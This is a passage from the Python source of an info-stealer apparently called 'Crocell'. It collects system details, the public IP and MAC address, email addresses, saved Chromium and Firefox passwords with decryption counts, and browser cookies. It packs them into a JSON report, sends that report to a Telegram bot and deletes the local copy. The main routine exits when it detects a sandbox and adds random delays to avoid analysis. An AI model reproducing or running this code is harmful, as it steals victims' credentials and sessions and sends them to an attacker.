                "frequency": f"{cpu_freq.current:.2f} MHz" if cpu_freq else "N/A",
            }
        except Exception as e:
            self.info["cpu"] = {"error": str(e)}

    def _collect_memory_info(self):
        """Collect memory information"""
        try:
            mem = psutil.virtual_memory()
            self.info["memory"] = {
                "total": f"{mem.total / (1024**3):.2f} GB",
                "available": f"{mem.available / (1024**3):.2f} GB",
                "used": f"{mem.used / (1024**3):.2f} GB",
                "percentage": f"{mem.percent}%",
            }
        except Exception as e:
            self.info["memory"] = {"error": str(e)}

    def _collect_disk_info(self):
        """Collect disk information"""
        try:
            if self.os_type == "Windows":
                disk_path = "C:\\"
            else:
                disk_path = "/"
            
            disk = psutil.disk_usage(disk_path)
            self.info["disk"] = {
                "total": f"{disk.total / (1024**3):.2f} GB",
                "used": f"{disk.used / (1024**3):.2f} GB",
                "free": f"{disk.free / (1024**3):.2f} GB",
                "percentage": f"{disk.percent}%",
            }
        except Exception as e:
            self.info["disk"] = {"error": str(e)}

    def _collect_network_info(self):
        """Collect network information"""
        try:
            try:
                public_ip = requests.get("https://api.ipify.org", timeout=5).text
            except:
                public_ip = "Unable to fetch"

            mac = ":".join(
                [
                    "{:02x}".format((uuid.getnode() >> elements) & 0xFF)
                    for elements in range(0, 2 * 6, 2)
                ][::-1]
            )

            self.info["network"] = {"public_ip": public_ip, "mac_address": mac}
        except Exception as e:
            self.info["network"] = {"error": str(e)}

    def _collect_boot_time(self):
        """Collect system boot time"""
        try:
            boot_time = psutil.boot_time()
            self.info["boot_time"] = boot_time
        except Exception as e:
            self.info["boot_time"] = {"error": str(e)}

    def _collect_emails(self):
        """Collect email addresses"""
        try:
            emails = self.email_extractor.extract_emails()
            self.info["emails"] = emails
        except Exception as e:
            self.info["emails"] = {"error": str(e)}

    def _collect_passwords(self):
        """Collect saved passwords from all browsers"""
        try:
            all_passwords = []
            
            # Collect from Chromium browsers
            if self.chromium_password_extractor:
                chromium_passwords = self.chromium_password_extractor.extract_passwords()
                all_passwords.extend(chromium_passwords)
            
            # Collect from Firefox
            if self.firefox_extractor:
                firefox_passwords = self.firefox_extractor.extract_passwords()
                all_passwords.extend(firefox_passwords)
            
            self.info["passwords"] = all_passwords
            
            # Count decrypted vs encrypted
            decrypted_count = sum(1 for p in all_passwords if p.get("password") != "[ENCRYPTED]")
            encrypted_count = len(all_passwords) - decrypted_count
            
            self.info["decrypted_count"] = decrypted_count
            self.info["encrypted_count"] = encrypted_count
            
        except Exception as e:
            self.info["passwords"] = {"error": str(e)}

    def _collect_cookies(self):
        """Collect browser cookies from all browsers"""
        try:
            all_cookies = []
            
            # Collect from Chromium browsers
            if self.chromium_cookie_extractor:
                chromium_cookies = self.chromium_cookie_extractor.extract_cookies()
                all_cookies.extend(chromium_cookies)
            
            # Collect from Firefox
            if self.firefox_extractor:
                firefox_cookies = self.firefox_extractor.extract_cookies()
                all_cookies.extend(firefox_cookies)
            
            self.info["cookies"] = all_cookies
            
            # Count session vs persistent
            session_count = sum(1 for c in all_cookies if c.get("is_session", False))
            persistent_count = len(all_cookies) - session_count
            
            self.info["session_cookies_count"] = session_count
            self.info["persistent_cookies_count"] = persistent_count
            
        except Exception as e:
            self.info["cookies"] = {"error": str(e)}

    def save_to_json(self, filename="crocell_report.json"):
        """Save collected information to JSON file"""
        try:
            # Organize passwords by browser
            passwords_by_browser = {}
            all_passwords = self.info.get("passwords", [])

            for pwd in all_passwords:
                browser = pwd.get("browser", "Unknown")
                if browser not in passwords_by_browser:
                    passwords_by_browser[browser] = {"decrypted": [], "encrypted": []}

                if pwd.get("password") == "[ENCRYPTED]":
                    passwords_by_browser[browser]["encrypted"].append(pwd)
                else:
                    passwords_by_browser[browser]["decrypted"].append(pwd)

            # Organize cookies by browser
            cookies_by_browser = {}
            all_cookies = self.info.get("cookies", [])

            for cookie in all_cookies:
                browser = cookie.get("browser", "Unknown")
                if browser not in cookies_by_browser:
                    cookies_by_browser[browser] = {"session": [], "persistent": []}

                if cookie.get("is_session", False):
                    cookies_by_browser[browser]["session"].append(cookie)
                else:
                    cookies_by_browser[browser]["persistent"].append(cookie)

            # Build organized password structure
            passwords_organized = {}
            for browser, pwd_data in passwords_by_browser.items():
                passwords_organized[browser] = {
                    "total": len(pwd_data["decrypted"]) + len(pwd_data["encrypted"]),
                    "decrypted_count": len(pwd_data["decrypted"]),
                    "encrypted_count": len(pwd_data["encrypted"]),
                    "decrypted_passwords": pwd_data["decrypted"],
                    "encrypted_passwords": pwd_data["encrypted"],
                }

            # Build organized cookies structure
            cookies_organized = {}
            for browser, cookie_data in cookies_by_browser.items():
                cookies_organized[browser] = {
                    "total": len(cookie_data["session"]) + len(cookie_data["persistent"]),
                    "session_count": len(cookie_data["session"]),
                    "persistent_count": len(cookie_data["persistent"]),
                    "session_cookies": cookie_data["session"],
                    "persistent_cookies": cookie_data["persistent"],
                }

            output_data = {
                "timestamp": datetime.now().isoformat(),
                "system": self.info.get("system", {}),
                "cpu": self.info.get("cpu", {}),
                "memory": self.info.get("memory", {}),
                "disk": self.info.get("disk", {}),
                "network": self.info.get("network", {}),
                "boot_time": datetime.fromtimestamp(
                    self.info.get("boot_time", 0)
                ).isoformat()
                if "boot_time" in self.info
                else None,
                "emails": self.info.get("emails", []),
                "passwords_by_browser": passwords_organized,
                "cookies_by_browser": cookies_organized,
                "summary": {
                    "total_passwords": len(all_passwords),
                    "total_decrypted": self.info.get("decrypted_count", 0),
                    "total_encrypted": self.info.get("encrypted_count", 0),
                    "total_cookies": len(all_cookies),
                    "total_session_cookies": self.info.get("session_cookies_count", 0),
                    "total_persistent_cookies": self.info.get("persistent_cookies_count", 0),
                    "browsers_found": list(set(list(passwords_by_browser.keys()) + list(cookies_by_browser.keys()))),
                },
            }

            with open(filename, "w", encoding="utf-8") as f:
                json.dump(output_data, f, indent=2, ensure_ascii=False)

            self.logger.info(f"Data saved to {filename}")
            return filename
        except Exception as e:
            self.logger.error(f"Error saving JSON: {str(e)}")
            return None

    def format_for_telegram(self):
        """Format system information for Telegram (summary only)"""
        message = "🖥️ *Crocell Cross-Platform System Report*\n\n"

        # System section
        if "system" in self.info and "error" not in self.info["system"]:
            sys = self.info["system"]
            message += "*System:*\n"
            message += f"OS: {sys.get('os', 'Unknown')}\n"
            message += f"Platform: {sys.get('platform', 'Unknown')}\n"
            message += f"Hostname: {sys.get('hostname', 'Unknown')}\n"
            message += f"User: {sys.get('system_user', 'Unknown')}\n\n"

        # CPU section
        if "cpu" in self.info and "error" not in self.info["cpu"]:
            cpu = self.info["cpu"]
            message += f"*CPU:* {cpu.get('total_cores', 'N/A')} cores\n\n"

        # Memory section
        if "memory" in self.info and "error" not in self.info["memory"]:
            mem = self.info["memory"]
            message += f"*Memory:* {mem.get('used', 'N/A')} / {mem.get('total', 'N/A')}\n\n"

        # Network section
        if "network" in self.info and "error" not in self.info["network"]:
            net = self.info["network"]
            message += f"*Network:* {net.get('public_ip', 'Unknown')}\n"
            message += f"*MAC:* {net.get('mac_address', 'Unknown')}\n\n"

        # Emails section
        if "emails" in self.info and isinstance(self.info["emails"], list):
            if self.info["emails"]:
                message += f"*📧 Emails:* {len(self.info['emails'])} found\n\n"

        # Passwords section
        if "passwords" in self.info and isinstance(self.info["passwords"], list):
            if self.info["passwords"]:
                decrypted = self.info.get("decrypted_count", 0)
                encrypted = self.info.get("encrypted_count", 0)
                total = decrypted + encrypted

                message += f"*🔑 Passwords:* {total} total\n"
                message += f"   ✅ Decrypted: {decrypted}\n"
                message += f"   🔒 Encrypted: {encrypted}\n\n"

        # Cookies section
        if "cookies" in self.info and isinstance(self.info["cookies"], list):
            if self.info["cookies"]:
                session_count = self.info.get("session_cookies_count", 0)
                persistent_count = self.info.get("persistent_cookies_count", 0)
                total_cookies = session_count + persistent_count

                message += f"*🍪 Cookies:* {total_cookies} total\n"
                message += f"   🔄 Session: {session_count}\n"
                message += f"   💾 Persistent: {persistent_count}\n\n"

        message += "📄 *Full detailed report sent as JSON file*"

        return message


# =============================================================================
# MAIN APPLICATION
# =============================================================================


def main():
    """Main application entry point"""
    try:
        # Anti-sandbox check
        if is_sandboxed():
            sys.exit(0)

        add_random_delay()

        # Load configuration (requires environment variables)
        try:
            config = Config()
        except ValueError as e:
            silent_print(f"ERROR: {e}")
            silent_print("Please set environment variables:")
            silent_print("  export CROCELL_BOT_TOKEN='your_bot_token'")
            silent_print("  export CROCELL_CHAT_ID='your_chat_id'")
            sys.exit(1)

        silent_print("Starting...")

        telegram = TelegramAPI(config)
        collector = SystemInfoCollector(
            config.log_level, 
            config.extract_passwords, 
            config.extract_cookies
        )
        system_info = collector.collect_all()

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        json_filename = f"temp_{timestamp}.json"
        saved_file = collector.save_to_json(json_filename)

        message = collector.format_for_telegram()

        success = telegram.send_message(message)
        silent_print("Message sent" if success else "Message failed")

        if saved_file and os.path.exists(saved_file):
            caption = f"Report {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            doc_success = telegram.send_document(saved_file, caption=caption)
            silent_print("File sent" if doc_success else "File failed")

            try:
                time.sleep(2)
                os.remove(saved_file)
            except:
                pass

        silent_print("Completed")
        sys.exit(0)

    except Exception as e:
        silent_print(f"Error: {e}")
        try:
            sys.exit(0)
        except:
            pass


if __name__ == "__main__":
    main()
